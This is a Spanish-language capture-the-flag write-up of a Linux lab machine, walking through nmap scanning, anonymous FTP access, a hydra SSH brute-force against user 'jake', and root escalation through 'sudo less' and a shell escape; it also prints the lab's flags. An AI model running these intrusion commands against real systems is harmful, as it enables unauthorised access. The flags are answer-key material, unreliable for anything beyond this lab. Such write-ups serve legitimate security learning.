
---

#### Reconocimiento y Enumeración 

- Maquina *Linux*

- Escaneo de Puertos

```java
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 61
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61
```

- Scripts de reconocimiento y Versiones 

```java
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.23.197.56
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

- Script de vulnerabilidades 

```java
❯ nmap -p21,22,80 --script "vuln" 10.201.36.142
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-28 16:04 -05
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.201.36.142
Host is up (0.24s latency).

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
```

---

#### Explotación 

- Podemos ver que el puerto 21 en la enumeración esta con una sesión de Anonymous, por lo cual accedemos a ella y nos encontramos con el siguiente txt que nos plantea diferentes usuarios

![[Pasted image 20251028161019.png]]

- *amy* , *jake* , *holt* 

- Como dicen que jake es el que tiene la contraseña mas insegura procedemos a realizar un ataque de fuerza bruta por el puerto 22 ssh 

```bash
hydra -l jake -P /usr/share/wordlist/rockyou.txt ssh://<IpVictima>
```

- Encontramos que para el usuario *jake* la contraseña es de *987654321*

- Nos conectamos via ssh y podemos ver que podemos entrar a otros directorio de usuarios como los directorios de *holt* y los directorios de *amy* , el directorio de *holt* tiene la primera flag de usuario la cual es *ee11cbb19052e40b07aac0ca060c23ee*

---
#### Escalada de Privilegios

- Escalamos privilegios de la siguiente forma

```bash
sudo -l   # Vemos los binarios de los cuales tenemos permisos y nos aparece el binario /usr/bin/less el cual lo buscamos en GTFobins

sudo less /etc/profile    # GTFobins nos dice que hagamos esto para escribir el fichero /etc/profile como root y lanzarnos una bash
!/bin/sh
```

- Ya siendo root y encontrando la ultima flag la cual es : *63a9f0ea7bb98050796b649e85481845*

